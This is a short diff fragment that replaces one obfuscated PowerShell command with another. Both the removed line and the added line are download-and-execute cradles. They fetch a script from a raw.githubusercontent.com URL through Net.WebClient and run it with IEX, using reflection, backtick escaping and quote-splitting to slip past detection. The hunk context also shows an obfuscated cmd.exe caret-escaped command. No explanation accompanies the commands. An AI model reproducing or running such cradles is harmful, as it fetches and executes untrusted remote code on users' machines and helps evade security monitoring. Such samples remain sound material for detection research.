@@ -17,5 +17,5 @@ cmd.exe /V:ON/C"set q47z=^^^^C^^^^M^^^^d; ; ; ^^^^/V  ;/^^^^R"" ;^^^^uet  6nK=""
 
 
 
-# iex(webclient(http...))
-SI Variable:\1h 'https://raw.githubusercontent.com/Tholep/data/master/ps';ls panyo*;SV 6jr (.$ExecutionContext.(($ExecutionContext|Get-Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Get-Member)[6].Name).PsObject.Methods|?{$_.Name-clike'*m*t'}).Name).Invoke($ExecutionContext.(($ExecutionContext|Get-Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Get-Member)[6].Name).PsObject.Methods|?{$_.Name-clike'*Com*e'}).Name).Invoke('*w-*ct',1,$TRUE))Net.W`ebCli`ent);I`E`X (Item Variable:/6jr).Value.((((Item Variable:/6jr).Value|Get-Member)|?{$_.Name-clike'*nl*g'}).Name).Invoke((LS Variable:/1h).Value)
+# 
+powershell -c i`e`x((New-Object N`et.W`ebClient).Downl"o"adS"tr"ing('h"tt"ps:"/"/raw.githubu"serc"ontent".c"om/Tholep/data/master/ps'))
